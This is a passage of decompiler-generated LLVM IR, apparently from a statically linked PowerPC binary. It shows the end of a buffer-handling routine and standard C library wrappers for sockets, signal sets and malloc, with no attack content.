dec_label_pc_1000eaa0:                            ; preds = %dec_label_pc_1000ea98
  %v2_1000eaa0 = mul i32 %v0_1000ea48, %tmp19
  store i32 %v2_1000eaa0, i32* @r5, align 4
  %v0_1000eaa4 = load i32, i32* @r30, align 4
  %v1_1000eaa4 = add i32 %v0_1000eaa4, 36
  store i32 %v1_1000eaa4, i32* %r3.global-to-local, align 4
  %v0_1000eaa8 = load i32, i32* @r31, align 4
  store i32 268495536, i32* @lr, align 4
  %v2_1000eaac = call i32 @memmove(i32 %v1_1000eaa4, i32 %v0_1000eaa8)
  store i32 %v2_1000eaac, i32* %r3.global-to-local, align 4
  store i32 %v2_1000eaa0, i32* %r0.global-to-local, align 4
  %v0_1000eabc = load i32, i32* @r30, align 4
  %v1_1000eabc = load i32, i32* @r31, align 4
  %v3_1000eabc = add i32 %v1_1000eabc, %v2_1000eaa0
  %v4_1000eabc = inttoptr i32 %v3_1000eabc to i32*
  store i32 %v0_1000eabc, i32* %v4_1000eabc, align 4
  %v0_1000eac0 = load i32, i32* @r31, align 4
  %v1_1000eac0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000eac0 = add i32 %v1_1000eac0, %v0_1000eac0
  store i32 %v2_1000eac0, i32* @r25, align 4
  %v1_1000eac8 = add i32 %v0_1000ea48, -1
  store i32 %v1_1000eac8, i32* %r11.global-to-local, align 4
  %v1_1000eacc = add i32 %v0_1000ea48, 1
  %v2_1000ead0 = icmp sgt i32 %v1_1000eac8, -1
  store i32 %v1_1000eacc, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000ead0, label %dec_label_pc_1000eb00.preheader, label %dec_label_pc_1000eadc

dec_label_pc_1000eadc:                            ; preds = %dec_label_pc_1000eaa0
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000eb00.preheader

dec_label_pc_1000eb00.preheader:                  ; preds = %dec_label_pc_1000eadc, %dec_label_pc_1000eaa0
  %v0_1000eb086 = phi i32 [ 1, %dec_label_pc_1000eadc ], [ %v1_1000eacc, %dec_label_pc_1000eaa0 ]
  %v1_1000eb003 = mul i32 %v1_1000eac8, 4
  store i32 %v1_1000eb003, i32* %r0.global-to-local, align 4
  %v2_1000eb045 = add i32 %v2_1000eac0, %v1_1000eb003
  %v1_1000eb087 = add i32 %v0_1000eb086, -1
  store i32 %v1_1000eb087, i32* %ctr.global-to-local, align 4
  %v2_1000eb088 = icmp eq i32 %v1_1000eb087, 0
  br i1 %v2_1000eb088, label %dec_label_pc_1000eb0c, label %dec_label_pc_1000eae8

dec_label_pc_1000eae8:                            ; preds = %dec_label_pc_1000eb00.preheader, %dec_label_pc_1000eae8.dec_label_pc_1000eae8_crit_edge
  %v1_1000eafc = phi i32 [ %v2_1000eb04, %dec_label_pc_1000eae8.dec_label_pc_1000eae8_crit_edge ], [ %v2_1000eb045, %dec_label_pc_1000eb00.preheader ]
  %v0_1000eaf4 = phi i32 [ %v0_1000eaf4.pre, %dec_label_pc_1000eae8.dec_label_pc_1000eae8_crit_edge ], [ %v0_1000eac0, %dec_label_pc_1000eb00.preheader ]
  %v0_1000eaec = phi i32 [ %v0_1000eb00, %dec_label_pc_1000eae8.dec_label_pc_1000eae8_crit_edge ], [ %v1_1000eac8, %dec_label_pc_1000eb00.preheader ]
  %v2_1000eaec = mul i32 %v0_1000eaec, %tmp19
  %v1_1000eaf0 = add i32 %v0_1000eaec, -1
  store i32 %v1_1000eaf0, i32* %r11.global-to-local, align 4
  %v2_1000eaf4 = add i32 %v0_1000eaf4, -8
  %v1_1000eaf8 = add i32 %v2_1000eaf4, %v2_1000eaec
  %v2_1000eafc = add i32 %v1_1000eafc, 4
  %v3_1000eafc = inttoptr i32 %v2_1000eafc to i32*
  store i32 %v1_1000eaf8, i32* %v3_1000eafc, align 4
  %v0_1000eb00 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb00 = mul i32 %v0_1000eb00, 4
  store i32 %v1_1000eb00, i32* %r0.global-to-local, align 4
  %v1_1000eb04 = load i32, i32* @r25, align 4
  %v0_1000eb08 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb08 = add i32 %v0_1000eb08, -1
  store i32 %v1_1000eb08, i32* %ctr.global-to-local, align 4
  %v2_1000eb08 = icmp eq i32 %v1_1000eb08, 0
  br i1 %v2_1000eb08, label %dec_label_pc_1000eb0c, label %dec_label_pc_1000eae8.dec_label_pc_1000eae8_crit_edge

dec_label_pc_1000eae8.dec_label_pc_1000eae8_crit_edge: ; preds = %dec_label_pc_1000eae8
  %v2_1000eb04 = add i32 %v1_1000eb04, %v1_1000eb00
  %v0_1000eaf4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000eae8

dec_label_pc_1000eb0c:                            ; preds = %dec_label_pc_1000eae8, %dec_label_pc_1000eb00.preheader
  %v1_1000eb18 = phi i32 [ %v2_1000eac0, %dec_label_pc_1000eb00.preheader ], [ %v1_1000eb04, %dec_label_pc_1000eae8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000eb14 = mul i32 %v0_1000ea48, 4
  %v2_1000eb18 = add i32 %v1_1000eb14, 4
  %v2_1000eb1c = add i32 %v2_1000eb18, %v1_1000eb18
  %v3_1000eb1c = inttoptr i32 %v2_1000eb1c to i32*
  store i32 0, i32* %v3_1000eb1c, align 4
  %v0_1000eb28 = load i32, i32* @r25, align 4
  %v2_1000eb28 = add i32 %v0_1000eb28, %v1_1000eb14
  store i32 %v2_1000eb28, i32* %r11.global-to-local, align 4
  %v1_1000eb2c = load i32, i32* @r31, align 4
  %v2_1000eb2c = sub i32 %v1_1000eb2c, %v2_1000eb28
  %v1_1000eb30 = add i32 %v2_1000eb28, 8
  store i32 %v1_1000eb30, i32* @r31, align 4
  %v0_1000eb34 = load i32, i32* @r27, align 4
  %v2_1000eb34 = add i32 %v0_1000eb34, %v2_1000eb2c
  %v1_1000eb38 = add i32 %v2_1000eb34, -8
  br label %dec_label_pc_1000eb3c

dec_label_pc_1000eb3c:                            ; preds = %dec_label_pc_1000ea98.dec_label_pc_1000eb3c_crit_edge, %dec_label_pc_1000eb0c
  %v0_1000eb44 = phi i32 [ %v0_1000eb44.pre, %dec_label_pc_1000ea98.dec_label_pc_1000eb3c_crit_edge ], [ %v1_1000eb30, %dec_label_pc_1000eb0c ]
  %v0_1000eb40 = phi i32 [ %v1_1000ea74, %dec_label_pc_1000ea98.dec_label_pc_1000eb3c_crit_edge ], [ %v1_1000eb38, %dec_label_pc_1000eb0c ]
  %v3_1000eb3c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000eb3c, i32* @r4, align 4
  store i32 %v0_1000eb44, i32* %r3.global-to-local, align 4
  store i32 268495692, i32* @lr, align 4
  %v3_1000eb48 = call i32 @strncpy(i32 %v0_1000eb44, i32 %v3_1000eb3c, i32 %v0_1000eb40)
  %v3_1000eb4c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000eb4c, i32* %r3.global-to-local, align 4
  store i32 268495700, i32* @lr, align 4
  %v1_1000eb50 = call i32 @free(i32 %v3_1000eb4c)
  store i32 %v1_1000eb50, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000eb58 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000eb58, label %dec_label_pc_1000eb60, label %dec_label_pc_1000eba8

dec_label_pc_1000eb60:                            ; preds = %dec_label_pc_1000eb3c
  store i32 4, i32* @r5, align 4
  %v0_1000eb68 = load i32, i32* @r30, align 4
  store i32 %v0_1000eb68, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000eb70.756 to i32), i32* @lr, align 4
  %v0_1000eb6c = call i32 @memcpy()
  %v1_1000eb74 = load i32, i32* @r26, align 4
  %v2_1000eb74 = add i32 %v1_1000eb74, 8
  %v3_1000eb74 = inttoptr i32 %v2_1000eb74 to i32*
  store i32 2, i32* %v3_1000eb74, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000eb7c = load i32, i32* @r26, align 4
  %v2_1000eb7c = add i32 %v1_1000eb7c, 12
  %v3_1000eb7c = inttoptr i32 %v2_1000eb7c to i32*
  store i32 4, i32* %v3_1000eb7c, align 4
  %v0_1000eb80 = load i32, i32* @r31, align 4
  %v1_1000eb80 = load i32, i32* @r26, align 4
  %v2_1000eb80 = inttoptr i32 %v1_1000eb80 to i32*
  store i32 %v0_1000eb80, i32* %v2_1000eb80, align 4
  %v0_1000eb84 = load i32, i32* @r25, align 4
  %v1_1000eb84 = load i32, i32* @r26, align 4
  %v2_1000eb84 = add i32 %v1_1000eb84, 16
  %v3_1000eb84 = inttoptr i32 %v2_1000eb84 to i32*
  store i32 %v0_1000eb84, i32* %v3_1000eb84, align 4
  %v0_1000eb88 = load i32, i32* @r21, align 4
  %v1_1000eb88 = load i32, i32* @r26, align 4
  %v2_1000eb88 = add i32 %v1_1000eb88, 4
  %v3_1000eb88 = inttoptr i32 %v2_1000eb88 to i32*
  store i32 %v0_1000eb88, i32* %v3_1000eb88, align 4
  %v3_1000eb8c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000eb8c, i32* %r3.global-to-local, align 4
  store i32 268495764, i32* @lr, align 4
  %v1_1000eb90 = call i32 @free(i32 %v3_1000eb8c)
  store i32 %v1_1000eb90, i32* %r3.global-to-local, align 4
  %v0_1000eb94 = load i32, i32* @r26, align 4
  %v1_1000eb94 = load i32, i32* @r20, align 4
  %v2_1000eb94 = inttoptr i32 %v1_1000eb94 to i32*
  store i32 %v0_1000eb94, i32* %v2_1000eb94, align 4
  br label %dec_label_pc_1000eba0

dec_label_pc_1000eba0:                            ; preds = %dec_label_pc_1000eba8, %dec_label_pc_1000e9ec, %dec_label_pc_1000eb60
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000eb60 ], [ 2, %dec_label_pc_1000e9ec ], [ 2, %dec_label_pc_1000eba8 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000eb60 ], [ 1, %dec_label_pc_1000e9ec ], [ 1, %dec_label_pc_1000eba8 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000eba0 = load i32, i32* @r24, align 4
  %v2_1000eba0 = inttoptr i32 %v1_1000eba0 to i32*
  store i32 %storemerge, i32* %v2_1000eba0, align 4
  br label %dec_label_pc_1000ebc0

dec_label_pc_1000eba8:                            ; preds = %dec_label_pc_1000eb3c
  %v3_1000eba8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000eba8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ebb0.757 to i32), i32* @lr, align 4
  %v1_1000ebac = call i32 @free(i32 %v3_1000eba8)
  store i32 %v1_1000ebac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000eba0

dec_label_pc_1000ebbc:                            ; preds = %dec_label_pc_1000e980, %dec_label_pc_1000e964, %dec_label_pc_1000e958, %dec_label_pc_1000e948, %dec_label_pc_1000e938
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ebc0

dec_label_pc_1000ebc0:                            ; preds = %dec_label_pc_1000e91c, %dec_label_pc_1000e914, %entry, %dec_label_pc_1000e8c8, %dec_label_pc_1000eba0, %dec_label_pc_1000ea7c, %dec_label_pc_1000e9c0, %dec_label_pc_1000ebbc
  store i32 %v0_1000e894, i32* %r0.global-to-local, align 4
  %v0_1000ebd0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ebd0

; uselistorder directives
  uselistorder i32 %v0_1000eb44, { 1, 0 }
  uselistorder i32 %v1_1000eb14, { 1, 0 }
  uselistorder i32 %v1_1000eb08, { 1, 0 }
  uselistorder i32 %v1_1000eb00, { 1, 0 }
  uselistorder i32 %v0_1000eaec, { 1, 0 }
  uselistorder i32 %v1_1000eb003, { 1, 0 }
  uselistorder i32 %v1_1000eac8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000eac0, { 1, 0, 2 }
  uselistorder i32 %v0_1000ea48, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000e98c, { 1, 0, 2 }
  uselistorder i32 %v0_1000e948.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000e930, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 23, 10, 9, 11, 1, 8, 12, 2, 13, 14, 3, 17, 19, 18, 20, 4, 21, 22, 24, 5, 25, 26, 6, 15, 7, 16, 0 }
  uselistorder i32* %r29.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r28.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 11, 12, 13, 14, 15, 17, 18, 16, 19, 10 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i8*)* @inet_aton, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebc0, { 7, 4, 5, 6, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000eba0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000eb3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000eae8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e948, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ebe8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268495864, i32* @lr, align 4
  %v2_1000ebf4 = call i32 @__socketcall(i32 3, i32 %v2_1000ebe8)
  ret i32 %v2_1000ebf4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ec1c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268495916, i32* @lr, align 4
  %v2_1000ec28 = call i32 @__socketcall(i32 6, i32 %v2_1000ec1c)
  ret i32 %v2_1000ec28

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ec50 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268495976, i32* @lr, align 4
  %v2_1000ec64 = call i32 @__socketcall(i32 15, i32 %v2_1000ec50)
  ret i32 %v2_1000ec64

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ec8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268496032, i32* @lr, align 4
  %v2_1000ec9c = call i32 @__socketcall(i32 10, i32 %v2_1000ec8c)
  ret i32 %v2_1000ec9c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ecc4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268496088, i32* @lr, align 4
  %v2_1000ecd4 = call i32 @__socketcall(i32 9, i32 %v2_1000ecc4)
  ret i32 %v2_1000ecd4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ecfc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268496152, i32* @lr, align 4
  %v2_1000ed14 = call i32 @__socketcall(i32 11, i32 %v2_1000ecfc)
  ret i32 %v2_1000ed14

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ed3c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268496212, i32* @lr, align 4
  %v2_1000ed50 = call i32 @__socketcall(i32 14, i32 %v2_1000ed3c)
  ret i32 %v2_1000ed50

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ed78 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268496264, i32* @lr, align 4
  %v2_1000ed84 = call i32 @__socketcall(i32 1, i32 %v2_1000ed78)
  ret i32 %v2_1000ed84

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 1, 6, 3, 4, 5, 7, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000edc8, label %dec_label_pc_1000edb4

dec_label_pc_1000edb4:                            ; preds = %entry
  %v0_1000edb4 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000edc0 = inttoptr i32 %v0_1000edb4 to i32*
  store i32 22, i32* %v2_1000edc0, align 4
  %v0_1000edd4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000edd0

dec_label_pc_1000edc8:                            ; preds = %entry
  %v0_1000edc8 = call i32 @__sigaddset()
  store i32 %v0_1000edc8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000edd0

dec_label_pc_1000edd0:                            ; preds = %dec_label_pc_1000edb4, %dec_label_pc_1000edc8
  %v0_1000edd4 = phi i32 [ %v0_1000edd4.pre, %dec_label_pc_1000edb4 ], [ %v0_1000edc8, %dec_label_pc_1000edc8 ]
  ret i32 %v0_1000edd4

; uselistorder directives
  uselistorder label %dec_label_pc_1000edd0, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268496380, i32* @lr, align 4
  %v3_1000edf8 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000ee10 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ee10, label %dec_label_pc_1000ee3c, label %dec_label_pc_1000ee2c

dec_label_pc_1000ee2c:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000ee3c, label %dec_label_pc_1000ee34

dec_label_pc_1000ee34:                            ; preds = %dec_label_pc_1000ee2c
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000ee6c.lr.ph, label %dec_label_pc_1000ee3c

dec_label_pc_1000ee3c:                            ; preds = %dec_label_pc_1000ee34, %dec_label_pc_1000ee2c, %entry
  %v0_1000ee3c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ee48 = inttoptr i32 %v0_1000ee3c to i32*
  store i32 22, i32* %v2_1000ee48, align 4
  %v0_1000eedc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eed8

dec_label_pc_1000ee6c.lr.ph:                      ; preds = %dec_label_pc_1000ee34
  %v2_1000ee5c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000ee5c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ee6c22 = add i32 %v2_1000ee5c, 128
  %v3_1000ee6c23 = inttoptr i32 %v2_1000ee6c22 to i32*
  store i32 0, i32* %v3_1000ee6c23, align 4
  %v0_1000ee7024 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee7025 = add i32 %v0_1000ee7024, -1
  store i32 %v1_1000ee7025, i32* %r11.global-to-local, align 4
  %v1_1000ee7426 = mul i32 %v1_1000ee7025, 4
  %v1_1000ee7827 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ee7828 = add i32 %v1_1000ee7827, %v1_1000ee7426
  store i32 %v2_1000ee7828, i32* %r9.global-to-local, align 4
  %v0_1000ee7c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ee7c30 = add i32 %v0_1000ee7c29, -1
  store i32 %v1_1000ee7c30, i32* %ctr.global-to-local, align 4
  %v2_1000ee7c31 = icmp eq i32 %v1_1000ee7c30, 0
  br i1 %v2_1000ee7c31, label %dec_label_pc_1000ee80, label %dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge

dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge: ; preds = %dec_label_pc_1000ee6c.lr.ph, %dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge
  %v2_1000ee7832 = phi i32 [ %v2_1000ee78, %dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge ], [ %v2_1000ee7828, %dec_label_pc_1000ee6c.lr.ph ]
  %v0_1000ee6c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ee6c = add i32 %v2_1000ee7832, 4
  %v3_1000ee6c = inttoptr i32 %v2_1000ee6c to i32*
  store i32 %v0_1000ee6c.pre, i32* %v3_1000ee6c, align 4
  %v0_1000ee70 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee70 = add i32 %v0_1000ee70, -1
  store i32 %v1_1000ee70, i32* %r11.global-to-local, align 4
  %v1_1000ee74 = mul i32 %v1_1000ee70, 4
  %v1_1000ee78 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ee78 = add i32 %v1_1000ee78, %v1_1000ee74
  store i32 %v2_1000ee78, i32* %r9.global-to-local, align 4
  %v0_1000ee7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ee7c = add i32 %v0_1000ee7c, -1
  store i32 %v1_1000ee7c, i32* %ctr.global-to-local, align 4
  %v2_1000ee7c = icmp eq i32 %v1_1000ee7c, 0
  br i1 %v2_1000ee7c, label %dec_label_pc_1000ee80, label %dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge

dec_label_pc_1000ee80:                            ; preds = %dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge, %dec_label_pc_1000ee6c.lr.ph
  %v0_1000ee84.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ee80 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000ee80, i32* @r3, align 4
  store i32 %v0_1000ee84.pre, i32* @r4, align 4
  %v0_1000ee88 = call i32 @__sigaddset()
  %v1_1000ee8c = icmp slt i32 %v0_1000ee88, 0
  br i1 %v1_1000ee8c, label %dec_label_pc_1000eed4, label %dec_label_pc_1000ee94

dec_label_pc_1000ee94:                            ; preds = %dec_label_pc_1000ee80
  %v0_1000ee98 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000eea0 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_10031bb8.760 to i32), i32 %v0_1000ee98)
  %v2_1000eeac = ptrtoint i32* %stack_var_-156 to i32
  store i32 268496580, i32* @lr, align 4
  %v4_1000eec0 = call i32 @__libc_sigaction(i32 %v0_1000ee98, i32* nonnull %stack_var_-296, i32 %v2_1000eeac)
  %v1_1000eec4 = icmp slt i32 %v4_1000eec0, 0
  br i1 %v1_1000eec4, label %dec_label_pc_1000eed4, label %dec_label_pc_1000eecc

dec_label_pc_1000eecc:                            ; preds = %dec_label_pc_1000ee94
  %v3_1000eecc = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000eecc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eed8

dec_label_pc_1000eed4:                            ; preds = %dec_label_pc_1000ee94, %dec_label_pc_1000ee80
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eed8

dec_label_pc_1000eed8:                            ; preds = %dec_label_pc_1000eecc, %dec_label_pc_1000ee3c, %dec_label_pc_1000eed4
  %v0_1000eedc = phi i32 [ %v3_1000eecc, %dec_label_pc_1000eecc ], [ %v0_1000eedc.pre, %dec_label_pc_1000ee3c ], [ -1, %dec_label_pc_1000eed4 ]
  ret i32 %v0_1000eedc

; uselistorder directives
  uselistorder i32 %v1_1000ee7c, { 1, 0 }
  uselistorder i32 %v2_1000ee78, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eed8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ee6c.dec_label_pc_1000ee6c_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000eef0 = add i32 %arg2, -1
  %v1_1000eef4 = call i32 @__asm_rlwinm(i32 %v1_1000eef0, i32 29, i32 3, i32 29)
  %v1_1000eef8 = urem i32 %v1_1000eef0, 32
  %v2_1000eefc = add i32 %v1_1000eef4, %arg1
  %v3_1000eefc = inttoptr i32 %v2_1000eefc to i32*
  %v4_1000eefc = load i32, i32* %v3_1000eefc, align 4
  %v3_1000ef04 = shl i32 1, %v1_1000eef8
  %v2_1000ef08 = and i32 %v4_1000eefc, %v3_1000ef04
  %v2_1000ef0c = icmp ne i32 %v2_1000ef08, 0
  %v5_1000ef10 = zext i1 %v2_1000ef0c to i32
  ret i32 %v5_1000ef10
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000ef18 = load i32, i32* @r4, align 4
  %v1_1000ef18 = add i32 %v0_1000ef18, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000ef20 = call i32 @__asm_rlwinm(i32 %v1_1000ef18, i32 29, i32 3, i32 29)
  %v1_1000ef24 = urem i32 %v1_1000ef18, 32
  %v1_1000ef28 = load i32, i32* @r3, align 4
  %v2_1000ef28 = add i32 %v1_1000ef28, %v1_1000ef20
  %v3_1000ef28 = inttoptr i32 %v2_1000ef28 to i32*
  %v4_1000ef28 = load i32, i32* %v3_1000ef28, align 4
  %v0_1000ef2c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000ef2c = shl i32 %v0_1000ef2c, %v1_1000ef24
  store i32 %v3_1000ef2c, i32* %r0.global-to-local, align 4
  %v2_1000ef30 = or i32 %v3_1000ef2c, %v4_1000ef28
  store i32 %v2_1000ef30, i32* %v3_1000ef28, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ef40 = add i32 %arg2, -1
  %v1_1000ef48 = call i32 @__asm_rlwinm(i32 %v1_1000ef40, i32 29, i32 3, i32 29)
  %v1_1000ef4c = urem i32 %v1_1000ef40, 32
  %v2_1000ef50 = add i32 %v1_1000ef48, %arg1
  %v3_1000ef50 = inttoptr i32 %v2_1000ef50 to i32*
  %v4_1000ef50 = load i32, i32* %v3_1000ef50, align 4
  %v3_1000ef54 = shl i32 -2, %v1_1000ef4c
  %v4_1000ef54 = sub nsw i32 32, %v1_1000ef4c
  %v5_1000ef54 = lshr i32 -2, %v4_1000ef54
  %v6_1000ef54 = or i32 %v5_1000ef54, %v3_1000ef54
  %v2_1000ef58 = and i32 %v6_1000ef54, %v4_1000ef50
  store i32 %v2_1000ef58, i32* %v3_1000ef50, align 4
  ret i32 0
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ef68 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000ef68 = icmp eq i32 %v0_1000ef68, 0
  br i1 %v3_1000ef68, label %dec_label_pc_1000ef80, label %dec_label_pc_1000ef84

dec_label_pc_1000ef80:                            ; preds = %entry
